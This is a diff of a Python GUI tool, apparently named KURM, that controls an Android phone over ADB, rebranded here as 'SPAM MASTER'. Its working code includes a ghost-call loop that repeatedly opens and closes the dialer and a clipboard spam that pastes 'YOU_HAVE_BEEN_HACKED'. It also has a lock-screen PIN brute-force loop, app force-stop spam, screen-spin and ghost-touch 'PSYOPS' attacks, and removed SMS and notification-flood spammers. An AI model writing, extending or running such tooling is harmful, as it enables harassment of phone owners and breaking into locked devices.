@@ -19,7 +19,7 @@ ASCII_KURM = r"""
  | ' /  | | | | | |_) | | |\/| |
  | . \  | |_| | |  _ <  | |  | |
  |_|\_\  \___/  |_| \_\ |_|  |_|
-      [ SMART FIX ]
+      [ SPAM MASTER ]
 """
 
 # 配色方案
@@ -37,8 +37,8 @@ class KurmToolkit(ctk.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("KURM Control Framework [v5.5 SMART FIX]")
-        self.geometry("1200x900")
+        self.title("KURM Control Framework [v5.3 SPAM MASTER]")
+        self.geometry("1200x850") 
         self.configure(fg_color=COLOR_BG)
 
         self.device_connected = False
@@ -61,14 +61,14 @@ class KurmToolkit(ctk.CTk):
         threading.Thread(target=self.monitor_device, daemon=True).start()
         threading.Thread(target=self.loop_recon_info, daemon=True).start()
         
-        self.log("KURM v5.5 Online. Clipboard Logic Fixed.")
+        self.log("KURM v5.3 Online. Notification Modules Ready.")
 
     def setup_sidebar(self):
         self.sidebar = ctk.CTkFrame(self, width=220, corner_radius=0, fg_color=COLOR_SIDEBAR, border_width=1, border_color="#111")
         self.sidebar.grid(row=0, column=0, sticky="nsew")
         
         ctk.CTkLabel(self.sidebar, text="KURM", font=("Verdana", 32, "bold"), text_color="#FFF").pack(pady=(30, 5))
-        ctk.CTkLabel(self.sidebar, text="Smart Edition", font=("Arial", 10), text_color="#666").pack(pady=(0, 20))
+        ctk.CTkLabel(self.sidebar, text="Spam Master", font=("Arial", 10), text_color="#666").pack(pady=(0, 20))
         
         self.status_label = ctk.CTkLabel(self.sidebar, text="● OFFLINE", font=("Arial", 14, "bold"), text_color="gray")
         self.status_label.pack(pady=10)
@@ -104,7 +104,7 @@ class KurmToolkit(ctk.CTk):
         self.tab_dash = self.tabview.add("DASHBOARD")
         self.tab_files = self.tabview.add("FILE EXPLORER")
         self.tab_bot = self.tabview.add("MACRO BOT")
-        self.tab_chaos = self.tabview.add("CHAOS & SPAM")
+        self.tab_chaos = self.tabview.add("CHAOS & SPAM") # 改名
 
         self.setup_dashboard(self.tab_dash)
         self.setup_file_explorer(self.tab_files)
@@ -139,20 +139,16 @@ class KurmToolkit(ctk.CTk):
         self.create_btn(f_controls, "Type Text", self.input_text_dialog)
         self.create_btn(f_controls, "Open URL", self.input_url_dialog)
         
-        ctk.CTkLabel(f_controls, text="ATTACK ARSENAL", font=("Arial", 12, "bold"), text_color=COLOR_TEXT_ACCENT).pack(anchor="w", pady=(20,0))
+        ctk.CTkLabel(f_controls, text="QUICK ATTACKS", font=("Arial", 12, "bold"), text_color=COLOR_TEXT_ACCENT).pack(anchor="w", pady=(20,0))
         
         grid_chaos = ctk.CTkFrame(f_controls, fg_color="transparent")
         grid_chaos.pack(fill="x")
         
-        # 完整的攻擊按鈕矩陣
+        # 攻擊按鈕矩陣
         self.create_btn_grid(grid_chaos, "[ATTACK] Ghost Call", self.ghost_call_dialog, 0, 0)
-        self.create_btn_grid(grid_chaos, "[ATTACK] SMS Spammer", self.sms_spam_dialog, 0, 1)
-        
-        self.create_btn_grid(grid_chaos, "[ATTACK] Clipboard Spam", self.start_clipboard_spam, 1, 0)
-        self.create_btn_grid(grid_chaos, "[ATTACK] App Glitcher", self.app_spammer_dialog, 1, 1)
-        
-        self.create_btn_grid(grid_chaos, "[ATTACK] Brute Force", self.brute_force_dialog, 2, 0)
-        self.create_btn_grid(grid_chaos, "[PSYOPS] Notif. Flood", self.start_notif_flood, 2, 1)
+        self.create_btn_grid(grid_chaos, "[ATTACK] Clipboard Spam", self.start_clipboard_spam, 0, 1)
+        self.create_btn_grid(grid_chaos, "[ATTACK] App Glitcher", self.app_spammer_dialog, 1, 0)
+        self.create_btn_grid(grid_chaos, "[ATTACK] Brute Force", self.brute_force_dialog, 1, 1)
 
     def create_info_label(self, parent, variable, r, c):
         f = ctk.CTkFrame(parent, fg_color="#111", width=120, height=40)
@@ -277,13 +273,16 @@ class KurmToolkit(ctk.CTk):
     def setup_chaos_ops(self, parent):
         ctk.CTkLabel(parent, text="PSYOPS & DISORIENT", font=("Courier", 20, "bold"), text_color=COLOR_TEXT_ACCENT).pack(pady=20)
         
-        self.create_btn(parent, "[ATTACK] Ghost Call", self.ghost_call_dialog)
-        self.create_btn(parent, "[ATTACK] Clipboard Spam (Smart)", self.start_clipboard_spam)
-        self.create_btn(parent, "[ATTACK] SMS Spammer", self.sms_spam_dialog)
-        self.create_btn(parent, "[PSYOPS] Notif. Flood", self.start_notif_flood)
+        # 1. 幽靈來電
+        self.create_btn(parent, "[PSYOPS] Ghost Call (Fake Dialer)", self.ghost_call_dialog)
         
+        # 2. 剪貼簿轟炸
+        self.create_btn(parent, "[PSYOPS] Clipboard Toast Spam", self.start_clipboard_spam)
+        
+        # 3. 其他
         self.create_btn(parent, "[DISORIENT] Screen Spin Loop", self.start_rotation_attack)
         self.create_btn(parent, "[DISORIENT] Ghost Touch", self.start_ghost_touch)
+        self.create_btn(parent, "[ATTACK] App Glitcher (Spam)", self.app_spammer_dialog)
         
         ctk.CTkButton(parent, text="STOP ALL ATTACKS", fg_color="red", text_color="white", command=self.stop_chaos).pack(pady=20, fill="x", padx=20)
 
@@ -294,86 +293,43 @@ class KurmToolkit(ctk.CTk):
         self.adb_bg("shell settings put system accelerometer_rotation 1")
         if hasattr(self, 'btn_spam'): self.btn_spam.configure(text="START SPAM", fg_color=COLOR_BTN_HOVER)
 
-    # [修復] 剪貼簿轟炸 (Smart Fix)
-    def start_clipboard_spam(self):
-        if messagebox.askyesno("PSYOPS", "Start Clipboard Spam?\n(This will annoy the user with paste popups)"):
-            self.chaos_running = True
-            threading.Thread(target=self._run_clipboard_spam).start()
-
-    def _run_clipboard_spam(self):
-        self.log("Clipboard Attack: Injecting Payload...")
-        
-        # 1. 偷渡文字進剪貼簿：打開簡訊輸入框 -> 輸入文字 -> 剪下
-        # 這比直接 input text 安全，不會在桌面觸發 Google
-        subprocess.run(f'{ADB_CMD} shell am start -a android.intent.action.SENDTO -d sms: -e sms_body "SYSTEM_HACKED_BY_KURM"', shell=True)
-        time.sleep(1) # 等視窗開好
-        
-        # 2. 發送 "剪下" 指令 (KEYCODE_CUT = 277)
-        # 這會把輸入框的字剪下並存到剪貼簿
-        subprocess.run(f"{ADB_CMD} shell input keyevent 277", shell=True) 
-        time.sleep(0.5)
-        
-        # 3. 回到首頁 (把簡訊視窗關掉)
-        subprocess.run(f"{ADB_CMD} shell input keyevent 3", shell=True) 
-        time.sleep(0.5)
-        
-        self.log("Payload Injected. Starting Spam Loop...")
-        
-        # 4. 瘋狂貼上
-        while self.chaos_running:
-            # 發送 "貼上" 指令 (KEYCODE_PASTE = 279)
-            subprocess.run(f"{ADB_CMD} shell input keyevent 279", shell=True)
-            time.sleep(0.3)
-            
-        self.log("Clipboard Spam Stopped.")
-
-    def start_notif_flood(self):
-        if messagebox.askyesno("PSYOPS", "Start Notification Flood?"):
-            self.chaos_running = True
-            threading.Thread(target=self._run_notif_flood).start()
-
-    def _run_notif_flood(self):
-        self.log("Notification Flood Started...")
-        while self.chaos_running:
-            subprocess.run(f"{ADB_CMD} shell cmd vibrator vibrate 500", shell=True)
-            # 交替快速拉下/收起
-            subprocess.run(f"{ADB_CMD} shell cmd statusbar expand-notifications", shell=True)
-            time.sleep(0.1)
-            subprocess.run(f"{ADB_CMD} shell cmd statusbar collapse", shell=True)
-            time.sleep(0.1)
-        self.log("Notification Flood Stopped.")
-
+    # [NEW] 幽靈來電：瘋狂開啟撥號介面
     def ghost_call_dialog(self):
-        d = ctk.CTkInputDialog(text="Number:", title="Ghost Call")
+        d = ctk.CTkInputDialog(text="Number to flash (e.g. 666):", title="Ghost Call")
         num = d.get_input()
         if num:
             self.chaos_running = True
             threading.Thread(target=lambda: self._run_ghost_call(num)).start()
 
     def _run_ghost_call(self, num):
-        self.log(f"Ghost Call: {num}")
+        self.log(f"Ghost Call Started: {num}")
         for i in range(50):
             if not self.chaos_running: break
+            # 啟動撥號介面
             subprocess.run(f'{ADB_CMD} shell am start -a android.intent.action.DIAL -d tel:{num}', shell=True)
             time.sleep(0.5)
-            subprocess.run(f"{ADB_CMD} shell input keyevent 4", shell=True) 
+            # 關閉它 (造成閃爍)
+            subprocess.run(f"{ADB_CMD} shell input keyevent 4", shell=True) # Back button
             time.sleep(0.3)
+        self.log("Ghost Call Stopped.")
 
-    def sms_spam_dialog(self):
-        d = ctk.CTkInputDialog(text="Message Text:", title="SMS Spammer")
-        txt = d.get_input()
-        if txt:
+    # [NEW] 剪貼簿轟炸：瘋狂貼上，觸發系統通知
+    def start_clipboard_spam(self):
+        if messagebox.askyesno("PSYOPS", "Start Clipboard Spam?\n(Triggers 'Pasted from...' toast)"):
             self.chaos_running = True
-            threading.Thread(target=lambda: self._run_sms_spam(txt)).start()
+            threading.Thread(target=self._run_clipboard_spam).start()
 
-    def _run_sms_spam(self, text):
-        self.log(f"SMS Spammer: {text}")
-        for i in range(50):
-            if not self.chaos_running: break
-            subprocess.run(f'{ADB_CMD} shell am start -a android.intent.action.SENDTO -d sms: -e sms_body "{text}"', shell=True)
-            time.sleep(0.5)
-            subprocess.run(f"{ADB_CMD} shell input keyevent 3", shell=True)
-            time.sleep(0.2)
+    def _run_clipboard_spam(self):
+        self.log("Clipboard Spam Started...")
+        # 先複製一段文字
+        subprocess.run(f'{ADB_CMD} shell input text "YOU_HAVE_BEEN_HACKED"', shell=True)
+        # 全選複製 (Ctrl+A, Ctrl+C) -> ADB 比較難做，我們直接用貼上指令 spam
+        while self.chaos_running:
+            # 發送「貼上」鍵值 (KEYCODE_PASTE = 279)
+            # 這在 Android 12+ 會觸發系統級的灰色通知
+            subprocess.run(f"{ADB_CMD} shell input keyevent 279", shell=True)
+            time.sleep(0.3)
+        self.log("Clipboard Spam Stopped.")
 
     def start_rotation_attack(self):
         if messagebox.askyesno("CHAOS", "Start Screen Rotation?"):
@@ -446,7 +402,7 @@ class KurmToolkit(ctk.CTk):
     def _run_brute_force(self, start_num):
         self.log("Brute Force Started...")
         for i in range(50):
-            if not self.chaos_running: break 
+            if not self.chaos_running and i>0: break
             pin = f"{start_num+i:04d}"
             self.log(f"Trying: {pin}")
             subprocess.run(f"{ADB_CMD} shell input keyevent 26", shell=True)
@@ -472,7 +428,6 @@ class KurmToolkit(ctk.CTk):
             subprocess.Popen(f"{ADB_CMD} shell am force-stop {pkg}", shell=True)
             time.sleep(0.1)
 
-    # --- 基礎功能 ---
     def create_btn(self, parent, text, cmd):
         ctk.CTkButton(parent, text=text, command=cmd, height=35, fg_color=COLOR_BTN_NORMAL, hover_color=COLOR_BTN_HOVER, text_color="#DDD").pack(fill="x", padx=10, pady=5)
     
